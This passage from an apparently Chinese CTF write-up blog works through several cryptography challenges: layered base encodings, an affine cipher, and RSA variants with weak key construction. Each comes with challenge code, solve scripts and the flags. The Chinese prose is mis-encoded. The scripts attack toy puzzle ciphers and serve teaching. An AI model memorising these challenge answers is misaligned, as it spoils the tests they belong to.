class="line">RzVJVFlaSkZGUk1HV1daWkdOQ0RFNEpJSE5RWEdOS05ISlNHSTNCT0daWVVXS1pDRzQzV01UQ0NISkVTNElKQkdKUkZFUEpYRjVIVk0zMlpIQVpXNjQyTkdaSlRBNFMzR1pKVENPMllIVjJWWVRMQ0daTERDTVpYR0JURk1TMlpHQlRWR0xDWkdaS1ZRWUo1R0ZURVFRSlNHQlRGNFQyTUc1SVRHUURFSFU3REVZSkVHNVdFS1FEUEdKUEVJS1NYRzQ0RkNRU0lITkNIQ1NaUEdWWlc0UlJZR1pZSEdRVFBHSVVXSVMzQkc0M0RHMkJIRzQ0R1lLU0VHQlFBPT09PQ==</span><br></pre></td></tr></table></figure></blockquote><p>base64-&gt;base32-&gt;base85-&gt;base45-&gt;base62-&gt;base58</p><p>flagï¼š</p><p><code>flag&#123;cl@ss1cal_c1pher_@re_really_1nterest1ng&#125;</code></p><p>â€‹</p><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h3><blockquote><p>You can do it if you understand the code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">get_context().precision = <span class="number">2048</span></span><br><span class="line"></span><br><span class="line">L = <span class="number">5</span></span><br><span class="line">S = getPrime(<span class="number">144</span>)</span><br><span class="line">a = getPrime(<span class="number">32</span>)</span><br><span class="line">b = random.randint(<span class="number">0</span>, S - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_and_pad_single_char_rule</span>(<span class="params">msg, L</span>):</span><br><span class="line"> segments = []</span><br><span class="line"> <span class="keyword">assert</span> L &gt;= <span class="number">1</span></span><br><span class="line"> pad_len = L - <span class="number">1</span></span><br><span class="line"> <span class="keyword">for</span> char_idx, char_byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg):</span><br><span class="line">     char_ascii = char_byte</span><br><span class="line">     pad_bytes = <span class="built_in">bytes</span>([(char_ascii + i + <span class="number">1</span>) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pad_len)])</span><br><span class="line">     seg_bytes = <span class="built_in">bytes</span>([char_byte]) + pad_bytes</span><br><span class="line">     segments.append(bytes_to_long(seg_bytes))</span><br><span class="line"> <span class="keyword">return</span> segments</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_segment</span>(<span class="params">m_i, a, b, M</span>):</span><br><span class="line"> <span class="keyword">return</span> (a * m_i + b) % M</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;___________________&#125;&quot;</span></span><br><span class="line">msg_bytes = flag.encode()</span><br><span class="line">m_segments = split_and_pad_single_char_rule(msg_bytes, L)</span><br><span class="line">c_segments = [encrypt_segment(mi, a, b, S) <span class="keyword">for</span> mi <span class="keyword">in</span> m_segments]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;S = <span class="subst">&#123;S&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;L = <span class="subst">&#123;L&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c_segments&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;M = <span class="subst">&#123;m_segments&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>æ¯ä¸ªå­—ç¬¦ $c$ è¢«å¡«å……ä¸ºé•¿åº¦ $L=5$ çš„å­—èŠ‚åºåˆ—ã€‚è§„åˆ™æ˜¯ï¼š[c, c+1, c+2, c+3, c+4]ï¼ˆæ¨¡ 256ï¼‰ï¼Œç„¶åå°†è¯¥å­—èŠ‚åºåˆ—è½¬æ¢ä¸ºæ•´æ•° $m_i$ã€‚</p><p>$c_i = (a \cdot m_i + b) \pmod S$ã€‚</p><p>å·²çŸ¥ï¼š$a$ï¼ˆä¹˜æ•°ï¼‰ï¼Œ$S$ï¼ˆæ¨¡æ•°ï¼Œæ˜¯ä¸€ä¸ªå¤§è´¨æ•°ï¼‰ï¼Œ$L$ï¼ˆæ®µé•¿åº¦ï¼‰ï¼Œ$C$ï¼ˆå¯†æ–‡åˆ—è¡¨ï¼‰</p><p>æœªçŸ¥ï¼šéšæœºç”Ÿæˆçš„ $b$ï¼ˆåŠ æ•°ï¼‰ï¼Œéœ€è¦è¿˜åŸçš„ $m_i$ï¼ˆæ˜æ–‡æ•´æ•°ï¼‰</p><p>å…¸å‹çš„ä»¿å°„å¯†ç ï¼Œè¦è§£å¯†éœ€æ±‚å‡º $b$ã€‚ç”±äºflagæ ¼å¼æ˜¯ <code>flag&#123;...&#125;</code>ï¼Œå¯åˆ©ç”¨ç¬¬ä¸€ä¸ªå­—ç¬¦ â€˜fâ€™ è¿›è¡Œå·²çŸ¥æ˜æ–‡æ”»å‡»ï¼š</p><p>$b \equiv c_0 - a \cdot m_0 \pmod S$</p><p>ä¸€æ—¦æ±‚å‡º $b$ï¼Œå¯¹äºä»»æ„å¯†æ–‡ $c_i$ï¼Œæ±‚å‡ºæ˜æ–‡ $m_i$ï¼š</p><p>$m_i \equiv a^{-1} \cdot (c_i - b) \pmod S$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">3517115977</span></span><br><span class="line">S = <span class="number">13338196046628817705384101887069807236659077</span></span><br><span class="line">L = <span class="number">5</span></span><br><span class="line">C = [<span class="number">6399813929853868574459915097120849511644924</span>, <span class="number">6399813929853868574460006087942330564102834</span>, <span class="number">6399813929853868574459839271436281967929999</span>, <span class="number">6399813929853868574459930262257763020387909</span>, <span class="number">6399813929853868574460233564996033195247609</span>, <span class="number">6399813929853868574460112243900725125303729</span>, <span class="number">6399813929853868574459111344864433548266719</span>, <span class="number">6399813929853868574459930262257763020387909</span>, <span class="number">6399813929853868574460036418216157581588804</span>, <span class="number">6399813929853868574459808941162454950444029</span>, <span class="number">6399813929853868574459111344864433548266719</span>, <span class="number">6399813929853868574460036418216157581588804</span>, <span class="number">6399813929853868574459808941162454950444029</span>, <span class="number">6399813929853868574460127409037638634046714</span>, <span class="number">6399813929853868574459096179727520039523734</span>, <span class="number">6399813929853868574459930262257763020387909</span>, <span class="number">6399813929853868574459899931983936002901939</span>, <span class="number">6399813929853868574460127409037638634046714</span>, <span class="number">6399813929853868574459945427394676529130894</span>, <span class="number">6399813929853868574459172005412087583238659</span>, <span class="number">6399813929853868574460097078763811616560744</span>, <span class="number">6399813929853868574459808941162454950444029</span>, <span class="number">6399813929853868574460188069585292669018654</span>, <span class="number">6399813929853868574459960592531590037873879</span>, <span class="number">6399813929853868574460188069585292669018654</span>, <span class="number">6399813929853868574459960592531590037873879</span>, <span class="number">6399813929853868574460263895269860212733579</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_m_from_char</span>(<span class="params">char, L</span>):</span><br><span class="line">    char_byte = <span class="built_in">ord</span>(char)</span><br><span class="line">    pad_len = L - <span class="number">1</span></span><br><span class="line">    pad_bytes = <span class="built_in">bytes</span>([(char_byte + i + <span class="number">1</span>) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pad_len)])</span><br><span class="line">    seg_bytes = <span class="built_in">bytes</span>([char_byte]) + pad_bytes</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(seg_bytes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨å·²çŸ¥æ˜æ–‡ &quot;f&quot; æ¢å¤ b</span></span><br><span class="line">m0 = get_m_from_char(<span class="string">&#x27;f&#x27;</span>, L)</span><br><span class="line">c0 = C[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">b = (c0 - a * m0) % S</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Recovered b: <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†æ‰€æœ‰æ®µ</span></span><br><span class="line">flag_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c_val <span class="keyword">in</span> C:</span><br><span class="line">    m_val = ((c_val - b) * inverse(a, S)) % S</span><br><span class="line">    char_code = m_val &gt;&gt; (<span class="number">8</span> * (L - <span class="number">1</span>))</span><br><span class="line">    flag_str += <span class="built_in">chr</span>(char_code)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;s1gn_1n_t0geth5r_xixi&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><blockquote><p>Think, think again.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_rev_sum</span>(<span class="params">m,p</span>):</span><br><span class="line"> <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"> <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">     digit = m % p</span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">round</span> % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">         <span class="built_in">sum</span> -= digit</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         <span class="built_in">sum</span> += digit</span><br><span class="line">     m = m // p</span><br><span class="line">     <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">sum</span> // <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m1 = getRandomNBitInteger(<span class="number">2048</span>)</span><br><span class="line">m2 = getRandomNBitInteger(<span class="number">2048</span>)</span><br><span class="line">sum1 = gen_rev_sum(m1, p)</span><br><span class="line">sum2 = gen_rev_sum(m2, p)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;--------------------------&#125;&quot;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m1 =&quot;</span>,m1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m2 =&quot;</span>,m2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sum1 =&quot;</span>,sum1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sum2 =&quot;</span>,sum2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,<span class="built_in">pow</span>(m,e,n))</span><br></pre></td></tr></table></figure></blockquote><p>gen_rev_sum å‡½æ•°å®é™…ä¸Šæ˜¯åœ¨è®¡ç®—æ•´æ•° $m$ åœ¨ $p$ è¿›åˆ¶ä¸‹çš„â€œäº¤é”™å’Œâ€ï¼ˆAlternating Sumï¼‰ã€‚</p><p>è®¾ $m$ çš„ $p$ è¿›åˆ¶è¡¨ç¤ºä¸ºï¼š$m = d_0 + d_1 p + d_2 p^2 + \dots + d_k p^k$ã€‚</p><p>ä»£ç é€»è¾‘æ˜¯ï¼š</p><p>Round 0 (å¶æ•°): sum -= digit ($d_0$)</p><p>Round 1 (å¥‡æ•°): sum += digit ($d_1$)</p><p>Round 2 (å¶æ•°): sum -= digit ($d_2$)</p><p>æ‰€ä»¥å†…éƒ¨çš„ sum å˜é‡è®¡ç®—çš„æ˜¯ï¼š$S = -d_0 + d_1 - d_2 + d_3 - \dots = \sum_{i} (-1)^{i+1} d_i$</p><p>å·²çŸ¥ $p \equiv -1 \pmod{p+1}$ï¼Œå› æ­¤ $p^i \equiv (-1)^i \pmod{p+1}$ã€‚</p><p>å¯¹äº $m$ï¼š</p><p>$m = \sum d_i p^i \equiv \sum d_i (-1)^i \pmod{p+1}$</p><p>å¯¹äº $S$ï¼š</p><p>$S = \sum d_i (-1)^{i+1} = - \sum d_i (-1)^i$</p><p>è§‚å¯Ÿä¸¤è€…å…³ç³»ï¼Œå¯ä»¥å¾—å‡ºç»“è®ºï¼š</p><p>$m \equiv -S \pmod{p+1}$</p><p>å³ï¼š$m + S$ æ˜¯ $p+1$ çš„å€æ•°ã€‚</p><p>ç¡®å®š $S$ çš„å€¼ï¼š</p><p>ç»™å‡ºçš„ sum1 å’Œ sum2 æ˜¯å‡½æ•° gen_rev_sum çš„è¿”å›å€¼ï¼Œå³ internal_sum // 2025ã€‚</p><p>æ ¹æ®Pythoné™¤æ³•ç‰¹æ€§ï¼š</p><p>$S_{real} = sum_{output} \times 2025 + r$</p><p>å…¶ä¸­ $r$ æ˜¯ä½™æ•°ï¼ŒèŒƒå›´åœ¨ $[0, 2024]$ ä¹‹é—´ã€‚</p><p>æœ‰ä¸¤ä¸ªæ–¹ç¨‹ï¼š</p><p>$m_1 + (sum_1 \times 2025 + r_1) = k_1 \cdot (p+1)$</p><p>$m_2 + (sum_2 \times 2025 + r_2) = k_2 \cdot (p+1)$</p><p>å…¶ä¸­ $m_1, m_2, sum_1, sum_2$ å·²çŸ¥ï¼Œ$r_1, r_2 \in [0, 2024]$ã€‚</p><p>å¯ä»¥éå† $r_1$ å’Œ $r_2$ï¼ˆæ€»å…± $2025 \times 2025 \approx 4 \times 10^6$ æ¬¡ç»„åˆï¼Œè®¡ç®—é‡å¾ˆå°ï¼‰ã€‚</p><p>å¯¹äºæ¯ä¸€å¯¹ $(r_1, r_2)$ï¼Œè®¡ç®—ï¼š</p><p>$val_1 = m_1 + sum_1 \times 2025 + r_1$</p><p>$val_2 = m_2 + sum_2 \times 2025 + r_2$</p><p>è®¡ç®— $g = \text{gcd}(val_1, val_2)$ã€‚</p><p>å¦‚æœ $r_1, r_2$ æ­£ç¡®ï¼Œé‚£ä¹ˆ $g$ ä¸€å®šå«æœ‰å› å­ $p+1$ã€‚ç”±äº $p$ æ˜¯256ä½çš„ï¼Œæ­£ç¡®çš„ $g$ ä¼šéå¸¸å¤§ã€‚ä¸€æ—¦æ‰¾åˆ°å¯èƒ½çš„ $p+1$ çš„å€æ•°ï¼Œå¯ä»¥å°è¯•é€šè¿‡é™¤ä»¥å°å› å­æ¥è¿˜åŸ $p$ï¼Œå¹¶éªŒè¯æ˜¯å¦èƒ½æ•´é™¤ $n$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">m1 = <span class="number">17322548249387769406385507000191215801044910756841784387283679508067232037647009879640247663005640315645559929483973978388785385751219073137080976227046261663059832428571101292873255962114141666488474602734594597852331665601154571683480014721045567844719377268571343706508041194359642732322649799872642255094259428635455750138217286588825326703937255171250131117864604764478573786940615096044575610751081788573681131616312486987096717266320380202191909867687322859634487150465591581523036586129341984826904474237818210411872793917742756628712320922128969576851582027757934655202892557206052328142121974846460835879379</span></span><br><span class="line">m2 = <span class="number">29770749505949559271464509877642735633388289947852331255230201935471628731047838190019590503471311260422939188831886032391799282413808339483805109656799786202448656409753608524222447399741340441803183979217817801933166848028113568228217090419247166878248450792302177597130681740006379413412297487888656975884867850858832779733076818160854085244264177562471933684902341628858046181331683501978826962693104997686104748486850900546849316714934730338449894336151567737740558472664876717516650156395237362632196760323299658988296623556674223583771795447537227301625104687705109034611911834940501083977979641467845119043780</span></span><br><span class="line">sum1 = -<span class="number">108877560874638575191632670246326227208412819991287356983577291185528002487</span></span><br><span class="line">sum2 = -<span class="number">47122048431044787786292644180145597499319125719652288525187634667738055282</span></span><br><span class="line">n = <span class="number">9020951256034058214321622067945640395058903219618790136239198219605516437223449048642101160150934286238922049363203171871230111420670637737169565825694393</span></span><br><span class="line">c = <span class="number">3323425622556846027480153848276857423081641901016156494250966280342935316300495906916254739461788219592704051961044937129981786472345610933524261214506540</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—åŸºç¡€å€¼ï¼Œå¾…åŠ ä½™æ•°</span></span><br><span class="line">base1 = m1 + sum1 * <span class="number">2025</span></span><br><span class="line">base2 = m2 + sum2 * <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">found_p = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†å¯èƒ½çš„ä½™æ•° r1 å’Œ r2</span></span><br><span class="line"><span class="keyword">for</span> r1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2025</span>):</span><br><span class="line">    val1 = base1 + r1</span><br><span class="line">    <span class="comment"># ç®€å•çš„ä¼˜åŒ–ï¼Œå¦‚æœæ‰¾åˆ°äº†å°±é€€å‡º</span></span><br><span class="line">    <span class="keyword">if</span> found_p: <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> r2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2025</span>):</span><br><span class="line">        val2 = base2 + r2</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è®¡ç®—æœ€å¤§å…¬çº¦æ•°</span></span><br><span class="line">        g = math.gcd(val1, val2)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># pæ˜¯256ä½çš„ï¼Œp+1ä¹Ÿæ˜¯ã€‚å¦‚æœGCDéå¸¸å¤§ï¼Œè¯´æ˜æ‰¾åˆ°äº†åŒ…å«p+1çš„å› å­</span></span><br><span class="line">        <span class="keyword">if</span> g &gt; <span class="number">2</span>**<span class="number">200</span>: </span><br><span class="line">            <span class="comment"># g å¯èƒ½æ˜¯ k * (p+1)</span></span><br><span class="line">            <span class="comment"># å°è¯•é™¤ä»¥å°çš„ç³»æ•° k æ¥è¿˜åŸ p</span></span><br><span class="line">            <span class="comment"># é€šå¸¸ k ä¼šå¾ˆå°ï¼Œå› ä¸º m æ˜¯éšæœºç”Ÿæˆçš„</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">                <span class="keyword">if</span> g % k == <span class="number">0</span>:</span><br><span class="line">                    potential_p_plus_1 = g // k</span><br><span class="line">                    potential_p = potential_p_plus_1 - <span class="number">1</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># éªŒè¯ p æ˜¯å¦èƒ½æ•´é™¤ n</span></span><br><span class="line">                    <span class="keyword">if</span> potential_p &gt; <span class="number">1</span> <span class="keyword">and</span> n % potential_p == <span class="number">0</span>:</span><br><span class="line">                        found_p = potential_p</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Found p! (r1=<span class="subst">&#123;r1&#125;</span>, r2=<span class="subst">&#123;r2&#125;</span>, k=<span class="subst">&#123;k&#125;</span>)&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_p: <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> found_p:</span><br><span class="line">    p = found_p</span><br><span class="line">    q = n // p</span><br><span class="line">    </span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    </span><br><span class="line">    m_int = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    flag = long_to_bytes(m_int)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to find p.&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Found p! (r1=1254, r2=1564, k=1)</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Reverse_Sum_Mod_p+i_GCD_2025!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><blockquote><p>What a peculiar prime number!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tran</span>(<span class="params">n</span>):</span><br><span class="line">	s_bin = <span class="built_in">bin</span>(n)[<span class="number">2</span>:]</span><br><span class="line">	bit_map = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;01&#x27;</span>&#125;</span><br><span class="line">	p_bin = <span class="string">&#x27;11&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([bit_map[bit] <span class="keyword">for</span> bit <span class="keyword">in</span> s_bin[<span class="number">1</span>:]])</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(p_bin, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">nbit</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s = getPrime(nbit)</span><br><span class="line">		p = tran(s)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> isPrime(p):</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		s_bin = <span class="built_in">bin</span>(s)[<span class="number">2</span>:].zfill(nbit)</span><br><span class="line">		q_bin = (s_bin[:nbit // <span class="number">2</span>]</span><br><span class="line">				 + <span class="string">&#x27;1&#x27;</span> * (nbit // <span class="number">2</span>)</span><br><span class="line">				 + s_bin[nbit // <span class="number">2</span>:]</span><br><span class="line">				 + <span class="string">&#x27;1&#x27;</span> * (nbit // <span class="number">2</span>))</span><br><span class="line">		q = <span class="built_in">int</span>(q_bin, <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">if</span> isPrime(q):</span><br><span class="line">				<span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;____________________________&#125;&quot;</span></span><br><span class="line">nbit = <span class="number">256</span></span><br><span class="line">p, q = keygen(nbit)</span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>ç”±æ„é€ å¯çŸ¥ï¼š</p><p>$q$ çš„æœ€ä½ 128 æ¯”ç‰¹å…¨æ˜¯ 1ï¼Œå³ $q \equiv -1 \pmod{2^{128}}$</p><p>æ‰€ä»¥ï¼š</p><p>$n = pq \equiv -p \pmod{2^{128}} \implies p \equiv -n \pmod{2^{128}}$</p><p><code>tran(s)</code> çš„ç»“æ„å†³å®šäº†ï¼š</p><ul><li>é™¤æœ€é«˜ä¸¤ä½ â€˜11â€™ å¤–ï¼Œp çš„æ¯ 2 bit ä¸€ç»„ï¼Œè¦ä¹ˆ 10ï¼ˆå¯¹åº” s çš„è¯¥ä½ä¸º 0ï¼‰ï¼Œè¦ä¹ˆ 01ï¼ˆå¯¹åº” s çš„è¯¥ä½ä¸º 1ï¼‰ã€‚</li><li>æœ€ä½ 128 æ¯”ç‰¹åªç”± s çš„æœ€ä½ 64 æ¯”ç‰¹å†³å®šã€‚</li><li>åˆ©ç”¨ç¬¬ 1 æ­¥å¾—åˆ°çš„ $p \bmod 2^{128}$ï¼Œå°†è¿™ 128 bit æŒ‰æ¯ä¸¤ä½ä¸€ç»„è§£ç ï¼Œå°±ç›´æ¥æ¢å¤äº† s çš„ä½ 64 ä½ã€‚</li></ul><p>æœ‰äº† s çš„å‰åŠéƒ¨åˆ†åï¼Œå¯ä»¥æŒ‰ä½ç»§ç»­çŒœ s çš„ä¸‹ä¸€ä½ï¼š</p><ol><li>ç»™å®šå½“å‰å·²çŸ¥çš„å‰ k ä½ï¼ˆlsb-firstï¼‰ï¼Œæ„é€ å‡ºå¯¹åº”çš„ p å’Œ q åœ¨æ¨¡ $2^k$ ä¸‹çš„æˆªæ–­å€¼ï¼ˆæ³¨æ„åªç”¨åˆ°å·²çŸ¥ä½ï¼‰ã€‚</li><li>æ£€æŸ¥ $(pq) \bmod 2^k$ æ˜¯å¦ç­‰äº $n \bmod 